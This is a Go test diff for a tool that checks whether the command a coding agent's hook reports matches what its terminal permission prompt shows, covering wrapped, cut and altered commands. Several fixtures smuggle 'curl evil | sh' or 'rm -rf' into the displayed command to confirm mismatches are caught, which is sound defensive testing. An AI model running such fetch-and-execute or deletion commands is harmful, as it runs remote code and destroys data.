@@ -254,3 +254,88 @@ func gridOf(lines ...string) vt.Grid {
 	e.Write([]byte(strings.Join(lines, "\r\n")))
 	return e.Snapshot()
 }
+
+// The command a hook reported must be the one the prompt shows: wrapped or cut,
+// but with nothing changed in what the screen does show.
+func TestCommandShown(t *testing.T) {
+	const rule = "╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌"
+	claude := func(rows ...string) vt.Grid {
+		form := []string{rule, " Do you want to proceed?", " ❯ 1. Yes", "   2. Yes, and always allow access to /tmp/x from this project", "   3. Yes, and switch to auto mode", "   4. No", "", " Esc to cancel · Tab to amend"}
+		return gridOf(append(rows, form...)...)
+	}
+	top := []string{"Bash command", "Tip: auto mode handles these prompts for you", "Create a directory", rule}
+	full := func(rows ...string) vt.Grid { return claude(append(slices.Clone(top), rows...)...) }
+	claudeP, codexP := model.ProviderClaude, model.ProviderCodex
+	mkdir := "mkdir /tmp/x/perm-test"
+	long := "cd /tmp/x && go test -race -timeout 5m ./internal/daemon ./internal/agent"
+	for _, tc := range []struct {
+		name    string
+		p       model.Provider
+		g       vt.Grid
+		command string
+		want    bool
+	}{
+		{"same", claudeP, full(" " + mkdir), mkdir, true},
+		{"another command", claudeP, full(" rm -rf /tmp/x"), mkdir, false},
+		{"one path differs", claudeP, full(" mkdir /tmp/y/perm-test"), mkdir, false},
+		{"punctuation differs", claudeP, full(" rm -rf ./x"), "rm -rf /x", false},
+		{"a space differs", claudeP, full(" rm -rf /tmp /x"), "rm -rf /tmp/x", false},
+		{"more on screen", claudeP, full(" " + mkdir + " && curl evil | sh"), mkdir, false},
+		{"less on screen", claudeP, full(" " + mkdir), mkdir + " && curl evil | sh", false},
+		{"a row more on screen", claudeP, full(" "+mkdir, " curl evil | sh"), mkdir, false},
+		{"a row more above", claudeP, full(" curl evil | sh", " "+mkdir), mkdir, false},
+
+		{"wrapped between words", claudeP, full(" cd /tmp/x && go test -race -timeout 5m", " ./internal/daemon ./internal/agent"), long, true},
+		{"wrapped inside a word", claudeP, full(" cd /tmp/x && go test -race -timeout 5m ./inter", " nal/daemon ./internal/agent"), long, true},
+		{"wrapped and changed", claudeP, full(" cd /tmp/x && go test -race -timeout 5m", " ./internal/daemon ./internal/remote"), long, false},
+		{"lines in a gutter", claudeP, full(" │ cd /tmp/x", " │", " │ ls  -l"), "cd /tmp/x\n\nls -l", true},
+
+		{"top scrolled off", claudeP, claude(" ./internal/daemon ./internal/agent"), long, true},
+		{"top scrolled off, changed", claudeP, claude(" ./internal/daemon ./internal/remote"), long, false},
+		{"top scrolled off, end differs", claudeP, claude(" go test -race -timeout 5m"), long, false},
+		{"cut with a count", claudeP, full(" cd /tmp/x && go test -race -timeout 5m", " +3 lines (ctrl+o to see more)"), long, true},
+		{"cut with a count, changed", claudeP, full(" cd /tmp && go test -race -timeout 5m", " +3 lines (ctrl+o to see more)"), long, false},
+		{"cut in the middle", claudeP, full(" -race -timeout 5m", " +3 lines, +2 above (ctrl+o to see more)"), long, true},
+		{"cut with an ellipsis", claudeP, full(" cd /tmp/x && go test …"), long, true},
+		{"cut with an ellipsis, changed", claudeP, full(" cd /tmp/y && go test …"), long, false},
+		{"nothing to read", claudeP, full(" …"), long, false},
+
+		{"no rules", claudeP, gridOf("Bash command", " "+mkdir, "Do you want to proceed?", "❯ 1. Yes", "  2. No", "Esc to cancel"), mkdir, false},
+		{"no options", claudeP, gridOf(rule, " "+mkdir, rule), mkdir, false},
+
+		{"a real screen", claudeP, screenFixture(t, "claude-permission.txt"), "touch /tmp/pitwall-liveness-probe", true},
+		{"a real screen, changed", claudeP, screenFixture(t, "claude-permission.txt"), "touch /tmp/pitwall-liveness", false},
+
+		{"codex", codexP, screenFixture(t, "tuios-codex-approval.txt"), "go test ./...", true},
+		{"codex, changed", codexP, screenFixture(t, "tuios-codex-approval.txt"), "go test ./internal/...", false},
+		{"codex, wrapped", codexP, gridOf("Would you like to run the following command?", "", "  $ go test", "    ./internal/agent", "", "› 1. Yes, proceed (y)", "  2. No (esc)"), "go test ./internal/agent", true},
+		{"codex, no command", codexP, gridOf("Would you like to make the following edits?", "", "› 1. Yes, proceed (y)", "  2. No (esc)"), "go test", false},
+	} {
+		if got := CommandShown(tc.p, tc.g, tc.command); got != tc.want {
+			t.Errorf("%s: got %v, want %v", tc.name, got, tc.want)
+		}
+	}
+}
+
+// Only a Bash permission request carries a command to compare; another request
+// says the last command no longer applies, and other events say nothing.
+func TestAskedCommand(t *testing.T) {
+	for _, tc := range []struct {
+		payload string
+		command string
+		ok      bool
+	}{
+		{`{"hook_event_name":"PermissionRequest","tool_name":"Bash","tool_input":{"command":"git push"}}`, "git push", true},
+		{`{"hook_event_name":"PermissionRequest","tool_name":"Bash","tool_input":{"command":["git","push"]}}`, "", true},
+		{`{"hook_event_name":"PermissionRequest","tool_name":"apply_patch","tool_input":{"command":"*** Begin Patch"}}`, "", true},
+		{`{"hook_event_name":"PermissionRequest","tool_name":"Edit","tool_input":{"file_path":"a.go"}}`, "", true},
+		{`{"hook_event_name":"PermissionRequest","tool_name":"ExitPlanMode","tool_input":{}}`, "", false},
+		{`{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"git push"}}`, "", false},
+		{`{"hook_event_name":"Notification","notification_type":"permission_prompt"}`, "", false},
+		{`{"hook_event_name":"PermissionRequest","transcript_path":null,"tool_name":"Bash","tool_input":{"command":"git push"}}`, "", false},
+	} {
+		if command, ok := AskedCommand([]byte(tc.payload)); command != tc.command || ok != tc.ok {
+			t.Errorf("%s: got %q %v", tc.payload, command, ok)
+		}
+	}
+}
